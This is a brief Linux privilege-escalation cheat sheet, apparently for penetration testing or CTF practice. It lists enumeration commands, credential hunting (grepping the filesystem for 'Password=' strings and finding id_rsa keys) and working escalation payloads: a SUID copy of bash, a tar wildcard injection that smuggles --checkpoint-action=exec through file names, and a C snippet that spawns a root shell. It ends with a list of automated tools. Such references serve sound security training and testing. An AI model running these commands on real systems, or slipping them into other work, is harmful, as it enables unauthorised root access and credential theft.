# Linux Privesc Cheat-Sheet

## System Enumeration

Kernel info - ``` uname -a ```

Proccesses,services - ps aux, ps aux | grep root

Suid - find / -perm -u=s -type f 2>/dev/null, find / -type f -perm -04000 -ls 2>/dev/null find / -perm -4000 2>/dev/null

trace - strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

Capabilities - getcap -r / 2>/dev/

NFS - cat /etc/exports

Architechture and cpu info - lscpu

## User Enumeration

Info about user - whoami, id

What can we run as sudo - sudo -l

Users - cat /etc/passwd, cat /etc/passwd | cut -d : -f 1

## Network Enumeration

IP info - ifconfig,

Routing info - ip route

Connections - netstat

## Password Hunting

Password phrases - grep --color=auto -rnw '/' -ie "Password=" --color=always 2> /dev/null

Password files - locate password

Finding ssh keys - find / -name id_rsa 2> /dev/null

## Useful commands

echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p" > file

cron wildcards

```

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh

touch /home/user/--checkpoint=1

touch /home/user/--checkpoint-action=exec=sh\ runme.sh

/tmp/bash -p

```

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c


## Automated Tools

1.Linpeas

2.LinEnum

3.Linux exploit suggester

4.Linux privchecker
